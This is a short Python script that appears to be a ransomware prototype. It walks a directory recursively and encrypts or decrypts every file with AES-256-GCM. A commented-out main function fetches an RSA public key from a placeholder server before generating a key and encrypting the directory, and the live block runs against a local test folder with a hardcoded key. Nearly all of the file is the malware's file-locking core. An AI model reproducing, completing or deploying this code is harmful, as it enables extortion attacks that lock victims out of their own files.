import socket
import pathlib
from cryptography.hazmat.primitives import serialization
from file import File
#import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os




def connect_to_server(public_ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((public_ip, port))
    return client_socket


def get_all_files(path):
    all_files = []
    dir_path = pathlib.Path(path)

    for item in dir_path.rglob("*"):
        if item.is_file():
            all_files.append(File(item.name, str(item.resolve()), item.stat().st_size))

    return all_files

def encrypt_all_files_in_directory(path, AES_key):
    all_files = get_all_files(path)
    for file in all_files:
        file.encrypt_file(AES_key)

def decrypt_all_files_in_directory(path, AES_key):
    all_files = get_all_files(path)
    for file in all_files:
        file.decrypt_file(AES_key)

# def main():
#     print("now starting main....")
#     server_public_ip = "SERVER_PUBLIC_IP"
#     port = 8080
#
#     server_sock = connect_to_server(server_public_ip, port)
#     public_key_bytes = server_sock.recv(4096)
#     rsa_public_key = serialization.load_pem_public_key(public_key_bytes)
#
#     AES_key_256 = AESGCM.generate_key(bit_length=256)
#     #nonce = os.urandom(12)
#
#     encrypt_all_files_in_directory(path, AES_key_256)


def test_encrpytion(path, key):
    encrypt_all_files_in_directory(path, key)

def test_decryption(path, key):
    decrypt_all_files_in_directory(path, key)


if __name__ == "__main__":
    #key = AESGCM.generate_key(bit_length=256)
    key = b'?\x96\xf1\xa2\xa9\x82\xcf!\x0cm\n\xa7\x00\x1c\x9b\x84\x89k#X|R\xe0d\'\xdaa"H\x1d\x9b\xae'
    #print(key)
    path = r"C:\Users\ariel\encryption_test"
    #test_encrpytion(path, key)
    test_decryption(path, key)
    #main()

